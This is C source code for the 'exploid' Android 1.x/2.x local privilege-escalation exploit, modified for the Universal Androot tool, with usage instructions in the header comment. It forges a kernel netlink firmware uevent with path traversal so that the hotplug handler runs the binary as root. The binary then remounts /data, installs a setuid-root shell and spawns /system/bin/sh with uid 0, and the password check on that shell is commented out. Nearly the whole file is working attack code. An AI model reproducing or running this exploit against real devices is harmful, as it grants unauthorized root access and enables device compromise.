/* android 1.x/2.x the real youdev feat. init local root exploit.
 * (C) 2009/2010 by The Android Exploid Crew.
 *
 * Copy from sdcard to /sqlite_stmt_journals/exploid, chmod 0755 and run.
 * Or use /data/local/tmp if available (thx to ioerror!) It is important to
 * to use /sqlite_stmt_journals directory if available.
 * Then try to invoke hotplug by clicking Settings->Wireless->{Airplane,WiFi etc}
 * or use USB keys etc. This will invoke hotplug which is actually
 * our exploit making /system/bin/rootshell.
 * This exploit requires /etc/firmware directory, e.g. it will
 * run on real devices and not inside the emulator.
 * I'd like to have this exploitet by using the same blockdevice trick
 * as in udev, but internal structures only allow world writable char
 * devices, not block devices, so I used the firmware subsystem.
 *
 * !!!This is PoC code for educational purposes only!!!
 * If you run it, it might crash your device and make it unusable!
 * So you use it at your own risk!
 *
 * Thx to all the TAEC supporters.
 */
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/mount.h>


// CHANGE!
#define SECRET "secret"


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


void copy(const char *from, const char *to)
{
	int fd1, fd2;
	char buf[0x1000];
	ssize_t r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0)
		die("[-] open");
	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0)
		die("[-] open");
	for (;;) {
		r = read(fd1, buf, sizeof(buf));
		if (r < 0)
			die("[-] read");
		if (r == 0)
			break;
		if (write(fd2, buf, r) != r)
			die("[-] write");
	}

	close(fd1);
	close(fd2);
	sync(); sync();
}


void clear_hotplug()
{
	int ofd = open("/proc/sys/kernel/hotplug", O_WRONLY|O_TRUNC);
	write(ofd, "", 1);
	close(ofd);
}


void unlinkTmpFiles() 
{
	unlink("/sqlite_stmt_journals/data");
	unlink("/sqlite_stmt_journals/hotplug");
	unlink("/sqlite_stmt_journals/loading");
	unlink("/sqlite_stmt_journals/mount");
	unlink("/sqlite_stmt_journals/fs_type");

	unlink("/data/local/tmp/data");
	unlink("/data/local/tmp/hotplug");
	unlink("/data/local/tmp/loading");
	unlink("/data/local/tmp/mount");
	unlink("/data/local/tmp/fs_type");

	unlink("/data/data/com.corner23.android.universalandroot/files/data");
	unlink("/data/data/com.corner23.android.universalandroot/files/hotplug");
	unlink("/data/data/com.corner23.android.universalandroot/files/loading");
	unlink("/data/data/com.corner23.android.universalandroot/files/mount");
	unlink("/data/data/com.corner23.android.universalandroot/files/fs_type");
}


void rootshell(char **env, char **argv)
{
	char pwd[128];
	char *sh[] = {"/system/bin/sh", 0};

	/* shakalaca: skip checks { */
	/*
	memset(pwd, 0, sizeof(pwd));
	readlink("/proc/self/fd/0", pwd, sizeof(pwd));

	if (strncmp(pwd, "/dev/pts/", 9) != 0)
		die("[-] memory tricks");

	write(1, "Password (echoed):", 18);
	memset(pwd, 0, sizeof(pwd));
	read(0, pwd, sizeof(pwd) - 1);
	sleep(2);

	if (strlen(pwd) < 6)
		die("[-] password too short");
	if (memcmp(pwd, SECRET, strlen(SECRET)) != 0)
		die("[-] wrong password");
        */
	/* shakalaca: skip checks } */
	
	setuid(0); setgid(0);

	unlinkTmpFiles();
	execve(*sh, argv, env);
	die("[-] execve");
}


int main(int argc, char **argv, char **env)
{
	char buf[512], path[512], buf2[512];
	int ofd, ifd;
	struct sockaddr_nl snl;
	struct iovec iov = {buf, sizeof(buf)};
	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
	int sock;
	char *basedir = NULL;
        int len;
        char path_fix[512];

        /* shakalaca: check if this program is called from UI or from CLI { */
	char pwd[128];

	memset(pwd, 0, sizeof(pwd));
	readlink("/proc/self/fd/0", pwd, sizeof(pwd));
        /* shakalaca: check if this program is called from UI or from CLI } */
	
 	/* I hope there is no LD_ bug in androids rtld :) */
	if (geteuid() == 0 && getuid() != 0)
		rootshell(env, argv);

        memset(path, 0, sizeof(path));
	if (readlink("/proc/self/exe", path, sizeof(path)) < 0)
		die("[-] readlink");

        len = strlen(path);
        if (path[len - 1] > 127) {
          len--;
        }
        
	if (geteuid() == 0) {
                char mp[128], fstype[16];
		clear_hotplug();
		/* remount /system rw */
                /* shakalaca: read mount settings from file { */
		/*
		if (mount("/dev/mtdblock0", "/system", "yaffs2", MS_REMOUNT, 0) < 0)
			mount("/dev/mtdblock0", "/system", "yaffs", MS_REMOUNT, 0);
                */
                /* shakalaca: check mount file and change to right directory */
                if ((ifd = open("/sqlite_stmt_journals/mount", O_RDONLY)) < 0) {
                  if ((ifd = open("/data/local/tmp/mount", O_RDONLY)) < 0) {
                    if ((ifd = open("/data/data/com.corner23.android.universalandroot/files/mount", O_RDONLY)) < 0) {
                      die("[-] missing required files..");
                    } else {
                      chdir("data/data/com.corner23.android.universalandroot/files/");
                      close(ifd);
                    }
                  } else {
                    chdir("/data/local/tmp");
                    close(ifd);
                  }
                } else {
                  chdir("/sqlite_stmt_journals");
                  close(ifd);
                }
                
                if ((ifd = open("mount", O_RDONLY)) < 0)
                        die("[-] open mount point");
		if (read(ifd, mp, sizeof(mp)) < 0)
		        die("[-] read mount point");
                close(ifd);

                if ((ifd = open("fs_type", O_RDONLY)) < 0)
                        die("[-] open fs type");
		if (read(ifd, fstype, sizeof(fstype)) < 0)
		        die("[-] read fs type");
                close(ifd);

                mount(mp, "/data", fstype, MS_REMOUNT, 0);
                /* shakalaca: read mount settings from file } */
                
                strncpy(path_fix, path, len);
                path_fix[len] = '\0';
		copy(path_fix, "/data/local/tmp/rootshell");
		chmod("/data/local/tmp/rootshell", 04711);
		/* shakalaca: do not loop forever, it will eat cpu resource { */
		/* 
		for (;;); 
		*/
		exit(1);
		/* shakalaca: do not loop forever, it will eat cpu resource } */
	}

	printf("[*] Android local root exploid (C) The Android Exploid Crew\n");
	printf("[*] Modified by shakalaca for various devices\n");

	/*
	basedir = "/sqlite_stmt_journals";
	if (chdir(basedir) < 0) {
		basedir = "/data/local/tmp";
		if (chdir(basedir) < 0)
			basedir = strdup(getcwd(buf, sizeof(buf)));
	}
	*/
        basedir = "/sqlite_stmt_journals";
        if (chdir(basedir) < 0) {
                basedir = strdup(getcwd(buf, sizeof(buf)));
                if (chdir("/data/local/tmp") < 0) {
                        // Use from Android UI, fall back to project directory
                	if (strncmp(pwd, "/dev/pts/", 9) != 0) {
                                basedir = "/data/data/com.corner23.android.universalandroot/files";
                                if (chdir(basedir) < 0)
                                        die("[-] chdir");
                        }
                } else {
                        // test if it's writable
                        if ((ofd = creat("test", 0644)) < 0) {
                                if (strncmp(pwd, "/dev/pts/", 9) != 0) {
                                        // Use from Android UI, fall back to project directory
                                        basedir = "/data/data/com.corner23.android.universalandroot/files";
                                }
                                if (chdir(basedir) < 0) 
                                        die("[-] chdir");
                        } else {
                                basedir = "/data/local/tmp";
                                unlink("test");
                        }
                        close(ofd);
                }
        }
	
	printf("[+] Using basedir=%s, path=%s\n", basedir, path);
	printf("[+] opening NETLINK_KOBJECT_UEVENT socket\n");
	
	/* shakalaca: remove old data if possible { */
	unlink("data");
	unlink("hotplug");
	unlink("loading");
	unlink("mount");
	unlink("fs_type");
	/* shakalaca: remove old data if possible } */

	memset(&snl, 0, sizeof(snl));
	snl.nl_pid = 1;
	snl.nl_family = AF_NETLINK;

	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
		die("[-] socket");

	close(creat("loading", 0666));
	if ((ofd = creat("hotplug", 0644)) < 0)
		die("[-] creat");
	if (write(ofd, path, len) < 0)
		die("[-] write");
	close(ofd);

	/* shakalaca: for remember mount device and filesystem type of /system { */
	if ((ofd = creat("mount", 0644)) < 0)
                die("[-] creat mount point");
        if (write(ofd, argv[1], strlen(argv[1])) < 0)
                die("[-] write mount point");        
        close(ofd);

	if ((ofd = creat("fs_type", 0644)) < 0)
                die("[-] creat fs type");
        if (write(ofd, argv[2], strlen(argv[2])) < 0)
                die("[-] write fs type");        
        close(ofd);
	/* shakalaca: for remember mount device and filesystem type of /system } */
	
	symlink("/proc/sys/kernel/hotplug", "data");
	snprintf(buf, sizeof(buf), "ACTION=add%cDEVPATH=/..%s%c"
	         "SUBSYSTEM=firmware%c"
	         "FIRMWARE=../../..%s/hotplug%c", 0, basedir, 0, 0, basedir, 0);
	printf("[+] sending add message ...\n");
	if (sendmsg(sock, &msg, 0) < 0)
		die("[-] sendmsg");
	close(sock);
	printf("[*] Try to invoke hotplug now, clicking at the wireless\n"
	       "[*] settings, plugin USB key etc.\n"
	       "[*] You succeeded if you find /system/bin/rootshell.\n"
	       "[*] GUI might hang/restart meanwhile so be patient.\n");
	sleep(3);
	return 0;
}

